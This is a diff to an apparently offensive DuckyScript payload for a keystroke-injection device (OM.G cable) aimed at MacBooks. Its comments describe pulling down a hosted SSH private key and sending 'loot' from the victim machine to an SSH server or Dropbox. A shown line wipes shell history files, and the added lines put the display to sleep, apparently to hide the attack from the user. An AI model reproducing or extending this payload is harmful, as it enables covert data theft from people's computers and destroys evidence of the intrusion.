@@ -8,9 +8,9 @@ REM Test: Macbook Pro 2019/2020 - Adjust the DELAY times based on your hardware.
 REM Tested with OM.G cable, but should work for any duckyscript capable device.
 REM Usage:
 REM  - Generate a temporary SSH key and configure the authorized_keys file with the public key
-REM  - Host your ssh private key on a web server, and replace with the URL to the private key - line 37
-REM  - Transfer loot over SSH - Configure the target SSH server hostname and credentials      - line 61
-REM  - Transfer loot to Dropbox - Set the API token and the target directory on dropbox       - line 73 
+REM  - Host your ssh private key on a web server, and replace with the URL to the private key - line 38
+REM  - Transfer loot over SSH - Configure the target SSH server hostname and credentials      - line 63
+REM  - Transfer loot to Dropbox - Set the API token and the target directory on dropbox       - line 77 
 
 REM DELAY 100
 REM GUI m
@@ -67,6 +67,9 @@ STRING clear && set -x && rm -rf /tmp/.s ~/.bash_history ~/.zsh_history && killa
 DELAY 300
 ENTER
 
+DELAY 500
+STRING pmset displaysleepnow
+ENTER
 
 REM ## The Dropbox way ##
 REM ## Usage: Replace the <ACCESS TOKEN> field with you access token, and replace the <DROPBOX DIRECTORY> field with the path where to store the looted file.
